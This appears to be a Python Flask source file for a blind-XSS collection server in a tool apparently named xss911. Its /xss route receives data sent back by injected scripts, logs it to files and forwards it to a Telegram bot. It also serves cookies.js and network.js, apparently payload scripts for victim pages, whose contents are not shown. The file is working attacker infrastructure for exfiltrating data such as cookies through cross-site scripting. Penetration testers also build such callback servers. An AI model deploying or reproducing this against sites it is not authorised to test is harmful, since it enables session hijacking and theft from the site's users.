from flask import Flask, request, jsonify
from datetime import datetime
from lib.utils.logger import logger
import os
import logging
import requests
import json

app = Flask(__name__)

# Configure logging
logging.basicConfig(filename='logs/xss_payloads.log', level=logging.INFO)

def get_telegram():
    try:
        with open('settings/telegram.json', 'r') as f:
            telegram = json.load(f)
            return telegram

    except FileNotFoundError:
        return None


def notify_telegram(payload):
    telegram = get_telegram()
    bot_token = telegram['bot_token']
    chat_id = telegram['chat_id']
    message = f"Blind XSS Payload received: {payload}"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"
    requests.get(url)
# Home route for status check
@app.route('/')
def index():
    return jsonify({"status": "Blind XSS server is running!"})

# Route to receive Blind XSS payloads
@app.route('/xss', methods=['GET', 'POST'])
def receive_xss():
    payload = request.args.get('payload') or request.form.get('payload')

    if payload:
        
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_message = f"[{timestamp}] Blind XSS Payload received: {payload}"
        notify_telegram(log_message)
        # Log to CLI
        logger.info(log_message)

        # Save to file
        with open('xss911/results/recieved_blind.txt', 'a') as file:
            file.write(log_message + '\n')

        # Log to xss_payloads.log
        logging.info(log_message)

        # Return a response
        return jsonify({"status": "Payload received", "payload": payload})

    return jsonify({"error": "No payload found!"})


@app.route('/cookies.js')
def cookies():
    return app.send_static_file('/static/cookies.js')

@app.route('/network.js')
def network():
    return app.send_static_file('/static/network.js')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
